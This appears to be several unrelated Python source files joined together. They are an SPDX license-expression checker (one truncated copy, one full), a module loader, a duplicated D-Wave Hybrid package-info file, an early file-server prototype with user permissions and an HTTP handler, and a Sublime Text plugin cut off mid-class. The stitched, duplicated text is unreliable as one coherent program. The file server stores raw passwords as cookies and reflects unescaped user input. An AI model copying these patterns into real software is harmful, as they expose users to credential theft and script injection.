    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find("SPDX-License-Identifier:") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \"'):
                    expr = expr.rstrip('\"').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith("LICENSES"):
            continue
        if el.path.find("license-rules.rst") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use "-"')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input "-" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ "preferred", "other", "exceptions" ]                    
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith("License-Text:"):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find("SPDX-License-Identifier:") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \"'):
                    expr = expr.rstrip('\"').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith("LICENSES"):
            continue
        if el.path.find("license-rules.rst") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use "-"')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input "-" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

import os
import sys
import imp
import logging


def _is_package(directory):                    
    return os.path.exists(os.path.join(directory, '__init__.py'))


def _guess_import_path_and_name(file):
    current = os.path.dirname(file)
    base = os.path.splitext(os.path.basename(file))[0]                    
    name = [base] if base != '__init__' else []                    
    parent = None                    
    while current != parent and _is_package(current):                    
        parent = os.path.dirname(current)                    
        name.append(os.path.basename(current))                    
        current = parent                    

    return current, '.'.join(reversed(name))                    


def run_file(runfile, func_to_get='main'):
    # Make sure imports within the module behave as expected
    import_path, name = _guess_import_path_and_name(runfile)
    if import_path not in sys.path:
        sys.path.insert(0, import_path)
    sys.modules['__tng_runfile__'] = module = imp.load_source(name, runfile)

    if hasattr(module, func_to_get):
        return getattr(module, func_to_get)
    else:
        logging.getLogger('tng').warn(
            'No {} function found in {}'.format(func_to_get, runfile))

# Copyright 2018 D-Wave Systems Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

__packagename__ = 'dwave-hybrid'
__title__ = 'D-Wave Hybrid'
__version__ = '0.1.4'                    
__author__ = 'D-Wave Systems Inc.'
__authoremail__ = 'radomir@dwavesys.com'
__description__ = 'Hybrid Asynchronous Decomposition Solver Framework'
__url__ = 'https://github.com/dwavesystems/dwave-hybrid'
__license__ = 'Apache 2.0'
__copyright__ = '2018, D-Wave Systems Inc.'

# Copyright 2018 D-Wave Systems Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

__packagename__ = 'dwave-hybrid'
__title__ = 'D-Wave Hybrid'
__version__ = '0.1.4'                    
__author__ = 'D-Wave Systems Inc.'
__authoremail__ = 'radomir@dwavesys.com'
__description__ = 'Hybrid Asynchronous Decomposition Solver Framework'
__url__ = 'https://github.com/dwavesystems/dwave-hybrid'
__license__ = 'Apache 2.0'
__copyright__ = '2018, D-Wave Systems Inc.'

#!/usr/bin/env python
# coding: utf-8
from __future__ import print_function

import os
import threading

from .__init__ import *


class VFS(object):
    """single level in the virtual fs"""

    def __init__(self, realpath, vpath, uread=[], uwrite=[]):
        self.realpath = realpath  # absolute path on host filesystem
        self.vpath = vpath  # absolute path in the virtual filesystem
        self.uread = uread  # users who can read this
        self.uwrite = uwrite  # users who can write this
        self.nodes = {}  # child nodes

    def add(self, src, dst):
        """get existing, or add new path to the vfs"""
        assert not src.endswith("/")
        assert not dst.endswith("/")

        if "/" in dst:
            # requires breadth-first population (permissions trickle down)
            name, dst = dst.split("/", 1)
            if name in self.nodes:
                # exists; do not manipulate permissions
                return self.nodes[name].add(src, dst)

            vn = VFS(
                "{}/{}".format(self.realpath, name),
                "{}/{}".format(self.vpath, name).lstrip("/"),
                self.uread,
                self.uwrite,
            )
            self.nodes[name] = vn
            return vn.add(src, dst)

        if dst in self.nodes:
            # leaf exists; return as-is
            return self.nodes[dst]

        # leaf does not exist; create and keep permissions blank
        vp = "{}/{}".format(self.vpath, dst).lstrip("/")
        vn = VFS(src, vp)
        self.nodes[dst] = vn
        return vn

    def undot(self, path):                    
        ret = []                    
        for node in path.split("/"):                    
            if node in ["", "."]:                    
                continue                    

            if node == "..":                    
                if ret:                    
                    ret.pop()                    
                continue                    

            ret.append(node)                    

        return "/".join(ret)                    

    def _find(self, vpath):
        """return [vfs,remainder]"""
        vpath = self.undot(vpath)                    
        if vpath == "":
            return [self, ""]

        if "/" in vpath:
            name, rem = vpath.split("/", 1)
        else:
            name = vpath
            rem = ""

        if name in self.nodes:
            return self.nodes[name]._find(rem)

        return [self, vpath]

    def ls(self, vpath, user):
        """return user-readable [virt,real] items at vpath"""
        vn, rem = self._find(vpath)

        if user not in vn.uread:
            return [[], []]

        rp = vn.realpath
        if rem:
            rp += "/" + rem

        real = os.listdir(rp)
        real.sort()
        if rem:
            virt_vis = []
        else:
            virt_all = []  # all nodes that exist
            virt_vis = []  # nodes readable by user
            for name, vn2 in sorted(vn.nodes.items()):
                virt_all.append(name)
                if user in vn2.uread:
                    virt_vis.append(name)

            for name in virt_all:
                try:
                    real.remove(name)
                except:
                    pass

        absreal = []
        for p in real:
            absreal.append("{}/{}".format(rp, p).replace("//", "/"))

        return [absreal, virt_vis]

    def user_tree(self, uname, readable=False, writable=False):
        ret = []                    
        opt1 = readable and uname in self.uread
        opt2 = writable and uname in self.uwrite
        if opt1 or opt2:
            ret.append(self.vpath)

        for _, vn in sorted(self.nodes.items()):
            ret.extend(vn.user_tree(uname, readable, writable))

        return ret


class AuthSrv(object):
    """verifies users against given paths"""

    def __init__(self, args, log_func):
        self.log_func = log_func
        self.args = args

        self.mutex = threading.Lock()
        self.reload()

    def log(self, msg):
        self.log_func("auth", msg)

    def invert(self, orig):
        if PY2:
            return {v: k for k, v in orig.iteritems()}
        else:
            return {v: k for k, v in orig.items()}

    def laggy_iter(self, iterable):
        """returns [value,isFinalValue]"""
        it = iter(iterable)
        prev = next(it)
        for x in it:
            yield prev, False
            prev = x

        yield prev, True

    def _parse_config_file(self, fd, user, mread, mwrite, mount):
        vol_src = None
        vol_dst = None
        for ln in [x.decode("utf-8").strip() for x in fd]:
            if not ln and vol_src is not None:
                vol_src = None
                vol_dst = None

            if not ln or ln.startswith("#"):
                continue                    

            if vol_src is None:
                if ln.startswith("u "):
                    u, p = ln[2:].split(":", 1)
                    user[u] = p
                else:
                    vol_src = ln
                continue                    

            if vol_src and vol_dst is None:
                vol_dst = ln
                if not vol_dst.startswith("/"):
                    raise Exception('invalid mountpoint "{}"'.format(vol_dst))

                # cfg files override arguments and previous files
                vol_src = os.path.abspath(vol_src)
                vol_dst = vol_dst.strip("/")
                mount[vol_dst] = vol_src
                mread[vol_dst] = []
                mwrite[vol_dst] = []
                continue                    

            lvl, uname = ln.split(" ")
            if lvl in "ra":
                mread[vol_dst].append(uname)
            if lvl in "wa":
                mwrite[vol_dst].append(uname)

    def reload(self):
        """
        construct a flat list of mountpoints and usernames
        first from the commandline arguments
        then supplementing with config files
        before finally building the VFS
        """

        user = {}  # username:password
        mread = {}  # mountpoint:[username]
        mwrite = {}  # mountpoint:[username]
        mount = {}  # dst:src (mountpoint:realpath)

        if self.args.a:
            # list of username:password
            for u, p in [x.split(":", 1) for x in self.args.a]:
                user[u] = p

        if self.args.v:
            # list of src:dst:permset:permset:...
            # permset is [rwa]username
            for src, dst, perms in [x.split(":", 2) for x in self.args.v]:
                src = os.path.abspath(src)
                dst = dst.strip("/")
                mount[dst] = src
                mread[dst] = []
                mwrite[dst] = []

                perms = perms.split(":")
                for (lvl, uname) in [[x[0], x[1:]] for x in perms]:
                    if uname == "":
                        uname = "*"
                    if lvl in "ra":
                        mread[dst].append(uname)
                    if lvl in "wa":
                        mwrite[dst].append(uname)

        if self.args.c:
            for cfg_fn in self.args.c:
                with open(cfg_fn, "rb") as f:
                    self._parse_config_file(f, user, mread, mwrite, mount)

        if not mount:
            # -h says our defaults are CWD at root and read/write for everyone
            vfs = VFS(os.path.abspath("."), "", ["*"], ["*"])
        elif not "" in mount:
            # there's volumes but no root; make root inaccessible
            vfs = VFS(os.path.abspath("."), "", [], [])

        maxdepth = 0
        for dst in sorted(mount.keys(), key=lambda x: (x.count("/"), len(x))):
            depth = dst.count("/")
            assert maxdepth <= depth
            maxdepth = depth

            if dst == "":
                # rootfs was mapped; fully replaces the default CWD vfs
                vfs = VFS(mount[dst], dst, mread[dst], mwrite[dst])
                continue                    

            v = vfs.add(mount[dst], dst)
            v.uread = mread[dst]
            v.uwrite = mwrite[dst]

        with self.mutex:
            self.vfs = vfs
            self.user = user
            self.iuser = self.invert(user)

        # import pprint
        # pprint.pprint({"usr": user, "rd": mread, "wr": mwrite, "mnt": mount})

#!/usr/bin/env python
# coding: utf-8
from __future__ import print_function

import time
import hashlib
import mimetypes
import jinja2

from .__init__ import *
from .util import *

if not PY2:
    unicode = str


class HttpCli(object):
    """
    Spawned by HttpConn to process one http transaction
    """

    def __init__(self, conn):
        self.conn = conn
        self.s = conn.s
        self.addr = conn.addr
        self.args = conn.args
        self.auth = conn.auth

        self.sr = conn.sr                    
        self.bufsz = 1024 * 32                    
        self.ok = True                    

        self.log_func = conn.log_func
        self.log_src = conn.log_src

    def log(self, msg):
        self.log_func(self.log_src, msg)

    def run(self):
        try:
            headerlines = read_header(self.sr)
        except:
            return False                    

        self.headers = {}
        try:
            mode, self.req, _ = headerlines[0].split(" ")
        except:
            self.log("bad headers:\n" + "\n".join(headerlines))                    
            return False                    

        for header_line in headerlines[1:]:
            k, v = header_line.split(":", 1)
            self.headers[k.lower()] = v.strip()

        self.uname = "*"
        if "cookie" in self.headers:
            cookies = self.headers["cookie"].split(";")
            for k, v in [x.split("=", 1) for x in cookies]:
                if k != "cppwd":
                    continue

                v = unescape_cookie(v)
                if v == "x":                    
                    break                    

                if not v in self.auth.iuser:                    
                    msg = u'bad_cpwd "{}"'.format(v)                    
                    nuke = u"Set-Cookie: cppwd=x; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT"                    
                    self.loud_reply(msg, headers=[nuke])                    
                    return True                    

                self.uname = self.auth.iuser[v]                    

        if self.uname:
            self.rvol = self.auth.vfs.user_tree(self.uname, readable=True)
            self.wvol = self.auth.vfs.user_tree(self.uname, writable=True)
            self.log(self.rvol)
            self.log(self.wvol)

        try:
            if mode == "GET":
                self.handle_get()
            elif mode == "POST":
                self.handle_post()
            else:                    
                self.loud_reply(u'invalid HTTP mode "{0}"'.format(mode))

        except Pebkac as ex:
            self.loud_reply(str(ex))
            return False                    

        return self.ok

    def reply(self, body, status="200 OK", mime="text/html", headers=[]):
        # TODO something to reply with user-supplied values safely
        response = [
            u"HTTP/1.1 " + status,
            u"Connection: Keep-Alive",
            u"Content-Type: " + mime,
            u"Content-Length: " + str(len(body)),
        ]
        response.extend(headers)
        response_str = u"\r\n".join(response).encode("utf-8")
        if self.ok:
            self.s.send(response_str + b"\r\n\r\n" + body)

        return body

    def loud_reply(self, body, *args, **kwargs):
        self.log(body.rstrip())
        self.reply(b"<pre>" + body.encode("utf-8"), *list(args), **kwargs)

    def handle_get(self):
        self.log("")
        self.log("GET  " + self.req)

        # "embedded" resources
        if self.req.startswith("/.cpr/"):                    
            static_path = os.path.join(E.mod, "web", self.req.split("?")[0][6:])                    

            if os.path.isfile(static_path):
                return self.tx_file(static_path)

        # split req into vpath + args
        args = {}                    
        vpath = self.req[1:]                    
        if "?" in vpath:                    
            vpath, arglist = vpath.split("?", 1)                    
            for k in arglist.split("&"):                    
                if "=" in k:                    
                    k, v = k.split("=", 1)                    
                    args[k.lower()] = v.strip()                    
                else:                    
                    args[k.lower()] = True                    

        # conditional redirect to single volumes
        if vpath == "" and not args:                    
            nread = len(self.rvol)
            nwrite = len(self.wvol)
            if nread + nwrite == 1:
                if nread == 1:
                    vpath = self.rvol[0]                    
                else:                    
                    vpath = self.wvol[0]                    

        # go home if verboten
        readable = vpath in self.rvol                    
        writable = vpath in self.wvol                    
        if not readable and not writable:
            self.log("inaccessible: {}".format(vpath))                    
            args = {"h"}                    

        self.vpath = vpath                    
        self.args = args                    

        if "h" in self.args:
            self.vpath = None
            return self.tx_mounts()

        if readable:
            return self.tx_browser()
        else:                    
            return self.tx_jupper()

    def handle_post(self):
        self.log("")
        self.log("POST " + self.req)

        try:
            if self.headers["expect"].lower() == "100-continue":
                self.s.send(b"HTTP/1.1 100 Continue\r\n\r\n")
        except:
            pass

        self.parser = MultipartParser(self.log, self.sr, self.headers)
        self.parser.parse()

        act = self.parser.require("act", 64)

        if act == u"bput":
            self.handle_plain_upload()
            return

        if act == u"login":
            self.handle_login()
            return

        raise Pebkac('invalid action "{}"'.format(act))

    def handle_login(self):
        pwd = self.parser.require("cppwd", 64)
        if not pwd in self.auth.iuser:                    
            h = [u"Set-Cookie: cppwd=x; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT"]                    
            self.loud_reply(u'bad_ppwd "{}"'.format(pwd), headers=h)                    
        else:                    
            h = ["Set-Cookie: cppwd={}; Path=/".format(pwd)]                    
            self.loud_reply(u"login_ok", headers=h)                    

    def handle_plain_upload(self):
        nullwrite = self.args.nw

        files = []
        t0 = time.time()
        for nfile, (p_field, p_file, p_data) in enumerate(self.parser.gen):
            fn = os.devnull
            if not nullwrite:
                fn = sanitize_fn(p_file)
                # TODO broker which avoid this race
                # and provides a new filename if taken
                if os.path.exists(fn):
                    fn += ".{:.6f}".format(time.time())

            with open(fn, "wb") as f:
                self.log("writing to {0}".format(fn))
                sz, sha512 = hashcopy(self.conn, p_data, f)
                if sz == 0:
                    break                    

                files.append([sz, sha512])

        td = time.time() - t0
        sz_total = sum(x[0] for x in files)
        spd = (sz_total / td) / (1024 * 1024)

        status = "OK"
        if not self.ok:
            status = "ERROR"

        msg = u"{0} // {1} bytes // {2:.3f} MiB/s\n".format(status, sz_total, spd)

        for sz, sha512 in files:
            msg += u"sha512: {0} // {1} bytes\n".format(sha512[:56], sz)
            # truncated SHA-512 prevents length extension attacks;
            # using SHA-512/224, optionally SHA-512/256 = :64

        self.loud_reply(msg)

        if not nullwrite:
            # TODO this is bad
            log_fn = "up.{:.6f}.txt".format(t0)
            with open(log_fn, "wb") as f:
                f.write(
                    (
                        u"\n".join(
                            unicode(x)
                            for x in [
                                u":".join(unicode(x) for x in self.addr),
                                msg.rstrip(),
                            ]
                        )
                        + "\n"
                    ).encode("utf-8")
                )

    def tx_file(self, path):
        sz = os.path.getsize(path)
        mime = mimetypes.guess_type(path)[0]
        header = "HTTP/1.1 200 OK\r\nConnection: Keep-Alive\r\nContent-Type: {}\r\nContent-Length: {}\r\n\r\n".format(
            mime, sz
        ).encode(
            "utf-8"
        )

        if self.ok:
            self.s.send(header)

        with open(path, "rb") as f:
            while self.ok:
                buf = f.read(4096)
                if not buf:
                    break                    

                self.s.send(buf)

    def tx_mounts(self):
        html = self.conn.tpl_mounts.render(this=self)
        self.reply(html.encode("utf-8"))

    def tx_jupper(self):
        self.loud_reply("TODO jupper {}".format(self.vpath))

    def tx_browser(self):
        self.loud_reply("TODO browser {}".format(self.vpath))



import sublime
import sublime_plugin
import os
import re
import Urtext.urtext as Urtext

class ToggleTraverse(sublime_plugin.TextCommand):
  def run(self,edit):  
    if self.view.settings().has('traverse'):
      if self.view.settings().get('traverse') == 'true':
        self.view.settings().set('traverse','false')
        self.view.set_status('traverse', 'Traverse: Off')
        return
    # if 'traverse' is not in settings or it's false: 
    self.view.settings().set('traverse', 'true')
    self.view.set_status('traverse', 'Traverse: On')
    self.view.window().set_layout({"cols":[0,0.4,1], "rows": [0,1], "cells": [[0, 0, 1, 1], [1, 0, 2, 1]]})

    # This moves all the files to right pane.
    # Maybe it's better to check individuall if they're already open, and then move them, as they are clicked.
    views = self.view.window().views()
    index = 0
    for view in views:
      if view != self.view:
        self.view.window().set_view_index(view, 1, index)
        index += 1

    self.view.window().focus_group(0)
    
class TraverseFileTree(sublime_plugin.EventListener):

  def on_selection_modified(self, view):
    if view.settings().get('traverse') == 'true':
      tree_view = view
      window = view.window()
      full_line = view.substr(view.line(view.sel()[0]))
      link = re.findall('->\s+([^\|]+)',full_line) # allows for spaces and symbols in filenames, spaces stripped later                    
      if len(link) > 0 :
        path = Urtext.get_path(view.window())                    
        window.focus_group(1)
        try:                    
          file_view = window.open_file(os.path.join(path, link[0].strip()) , sublime.TRANSIENT)                    
          file_view.set_scratch(True)                    
        except:                    
          print('unable to open '+link[0])                    
        self.return_to_left(file_view, tree_view)
         
  def return_to_left(self, view,return_view):                    
    if not view.is_loading():
        view.window().focus_view(return_view)
        view.window().focus_group(0)
    else:
      sublime.set_timeout(lambda: self.return_to_left(view,return_view), 10)


# Urtext - Main
import sublime
import sublime_plugin
import os
import re
import Urtext.datestimes
import Urtext.meta
import sys
sys.path.append(os.path.join(os.path.dirname(__file__)))
from anytree import Node, RenderTree
import codecs
import logging

# note -> https://forum.sublimetext.com/t/an-odd-problem-about-sublime-load-settings/30335

def get_path(window):
  """ Returns the Urtext path from settings """
  if window.project_data():
    path = window.project_data()['urtext_path'] # ? 
  else:
    path = '.'
  return path

def get_all_files(window):
  """ Get all files in the Urtext Project. Returns an array without file path. """
  path = get_path(window)
  files = os.listdir(path)
  urtext_files = []
  regexp = re.compile(r'\b\d{14}\b')
  for file in files:
    try:
      f = codecs.open(os.path.join(path, file), encoding='utf-8', errors='strict')
      for line in f:
          pass
      if regexp.search(file):  
        urtext_files.append(file)
    except UnicodeDecodeError:
      print("Urtext Skipping %s, invalid utf-8" % file)  
    except:
      print('Urtext Skipping %s' % file)
  return urtext_files

class UrtextFile:
  def __init__(self, filename):                    
    self.path = os.path.dirname(filename)                    
    self.filename = os.path.basename(filename)
    self.node_number = re.search(r'\b\d{14}\b|$',filename).group(0)
    self.index = re.search(r'^\d{2}\b|$', filename).group(0)
    self.title = re.search(r'[^\d]+|$',filename).group(0).strip()                    
    self.log()                    

  def set_index(self, new_index):
    self.index = new_index

  def set_title(self, new_title):
    self.title = new_title

  def log(self):
    logging.info(self.node_number)
    logging.info(self.title)
    logging.info(self.index)
    logging.info(self.filename)

  def rename_file(self):
    old_filename = self.filename
    if len(self.index) > 0:
      new_filename = self.index + ' '+ self.title + ' ' + self.node_number + '.txt'
    elif self.title != 'Untitled':
      new_filename = self.node_number + ' ' + self.title + '.txt'
    else:
      new_filename = old_filename
    os.rename(os.path.join(self.path, old_filename), os.path.join(self.path, new_filename))
    self.filename = new_filename
    return new_filename

class RenameFileCommand(sublime_plugin.TextCommand):
